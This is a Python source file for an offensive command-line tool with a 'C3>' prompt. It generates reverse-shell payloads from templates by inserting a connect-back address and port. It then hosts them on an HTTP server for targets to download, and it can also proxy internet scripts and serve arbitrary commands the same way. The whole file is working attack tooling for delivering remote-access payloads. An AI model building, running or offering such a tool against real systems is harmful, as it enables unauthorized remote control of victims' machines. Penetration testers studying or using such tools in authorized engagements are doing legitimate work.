import argparse
import multiprocessing
import urllib.request
import shells
import http.server
import socketserver
from presets import preset_urls
from banner import banner

try:
    import netifaces as ni
    ifacesEnabled = True
except:
    print('Package netifaces not found, cannot use interface for IP retrieval')
global payload
payload ="No payload selected!"


help = """
Available commands:

reverse [method] - Creates a reverse shell and either serves it over http or prints it (Method either serve or print)
proxy [url/preset] - Downloads and serves a single webpage over http. Param 1 is an url or a preset name. 
exec [command] - Serves the given command as text on http-server
set [option] [value] - Sets the value for an option, overwriting the one given as a commandline param.
shells - Prints available shell-types
presets - Prints presets
options - Prints options
stop - Kill the http-server
exit - Exit the application
\n

"""

class ShellHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        global payload
        try:
            self.wfile.write(payload.encode())
        except:
            self.wfile.write(payload)


def print_shells():
    print('Available shells:')
    for shell in shells.shells:
        print(shell['name'])


def get_ip_address(ifname):
    return ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']


def listener(port):
    print("Starting webserver on port " + port)
    with socketserver.TCPServer(("", int(port)), ShellHandler) as httpd:
        httpd.serve_forever()


def start_server():
    if not options['httpPort']:
        print("Error, http port not set")
    global process
    process = multiprocessing.Process(target=listener, args=(options['httpPort'],))
    process.start()
    process.join()


def print_options():
    print("Options:\n")
    for key, value in options.items():
        print(key + ":" + str(value))
    print("\n")

def print_presets():
    for key, value in preset_urls:
        print(key + ":" + str(value))
        print("\n")


def open_shellfile():
    print("Opening shellfile: "+options['shell'])
    if not options['localAddr'] or not options['localPort']:
        print("Error! Set localPort and localAddr")
    results = list(filter(lambda shell: shell['name'] == options['shell'], shells.shells))
    if len(results) > 0:
        selected_shell = results[0]
    else:
        print('ERROR: Unregognized shell type\n')
        print_shells()

    shell_file = open('shells/' + selected_shell['file'], 'r')
    data = shell_file.read()
    data = data.replace('[LIP]', options['localAddr']).replace('[LP]', str(options['localPort']))
    return data


def set_value(key, value):
    if options.__contains__(key):
        options[key] = value
        print_options()


def open_url(url):
    if url in preset_urls:
        url = preset_urls[url]

    if "://" not in url:
        url = 'https://'+url
    print("Proxying url: "+url)
    with urllib.request.urlopen(url) as f:
        html = f.read()
        return html


running = True

parser = argparse.ArgumentParser(
    description='A script to generate reverse shells, proxy scripts from the internet and issue commands')
parser.add_argument('-l', dest='shell',
                    help='Language to identify the shell to be built. Use -s to see available shells.')
parser.add_argument('-a', dest='localAddr', type=str, help='Address to connect back to')
parser.add_argument('-p', dest='localPort', help='Port to connect back to', default=4444)
parser.add_argument('-i', dest="interface", help="Interface name to get ip for reverse shell script")
parser.add_argument('-s', dest='httpPort', help='Port to start HTTP server in, default 80', default=80)


args = parser.parse_args()
options = vars(args)
print(banner)
print_options()

process = multiprocessing.Process(target=listener, args=(options['httpPort'],))


def restart_server():
    if process.is_alive():
        process.kill()
    process.start()

#TODO: Better "switch" case
while running:
    cmd = input('C3>')
    words = cmd.split(" ")

    if words[0] == 'stop':
        process.kill()
    elif words[0].startswith("set"):
        set_value(words[1], words[2])
    elif words[0] == 'reverse':
        payload = open_shellfile()
        if words[1] == 'serve':
            process.start()
        elif words[1] == 'print':
            print(payload)
    elif words[0] == 'proxy':
        payload = open_url(words[1])
        restart_server()
    elif words[0] == 'exec':
        payload = words[1]
        restart_server()
    elif words[0] == 'presets':
        print_presets()
    elif words[0] == 'options':
        print_options()
    elif words[0] == 'help' or words[0] == '?':
        print(help)
    elif words[0] == 'exit':
        running = False
